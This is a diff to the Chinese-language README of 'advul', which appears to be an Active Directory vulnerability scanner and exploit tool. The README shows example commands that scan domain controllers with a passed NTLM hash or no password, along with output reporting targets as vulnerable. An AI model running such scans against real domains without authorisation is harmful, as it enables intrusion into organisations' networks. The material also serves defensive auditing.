@@ -16,7 +16,7 @@ usage: main.py [-h] [-ts] [-debug] [-dc-ip ip address] [-target-ip ip address]
                [-no-pass] [-all-dc] [-tf target file] [--threads threads]
                {33679,26923,42287}
 
-AD常见漏洞扫描/利用工具
+AD高危漏洞扫描/利用工具
 
 positional arguments:
   {33679,26923,42287}   Action
@@ -99,6 +99,7 @@ PAC条目来判断目标域控是否安装更新补丁。
 2. #### 批量扫描
    ```text
    PS C:\> python.exe advul/main.py -ts -all-dc -u JDCA$@jd.local -hashes 48f925772624af82147e750a45b912a8 -dc-ip 192.168.31.110 26923 
+
    [2023-07-15 02:59:48] [*] [192.168.31.110] success, target is vulnerable!!!
    [2023-07-15 02:59:48] [*] [192.168.31.111] constraintViolation, target is not vulnerable :<
    ```
@@ -110,12 +111,14 @@ PAC条目来判断目标域控是否安装更新补丁。
 
 1. #### 扫描单个目标
    ```text
-   PS C:\> python.exe C:/Users/ateam/Downloads/tools/Python39_1/Scripts/advul/main.py -ts -no-pass -dc-ip 192.168.31.110 -u mayun@jd.local 33679 
+   PS C:\> python.exe advul/main.py -ts -no-pass -dc-ip 192.168.31.110 -u mayun@jd.local 33679 
+
    [2023-07-15 03:05:49] [*] [192.168.31.110] has 33679
    ```
 2. #### 批量扫描
    ```text
    PS C:\> python.exe advul/main.py -ts -tf dcs.txt -no-pass -dc-ip 192.168.31.110 -u mayun@jd.local 33679 
+
    [2023-07-15 03:04:24] [*] [192.168.31.110] has 33679
    [2023-07-15 03:04:24] [*] [192.168.31.111] is not vuln
    ```
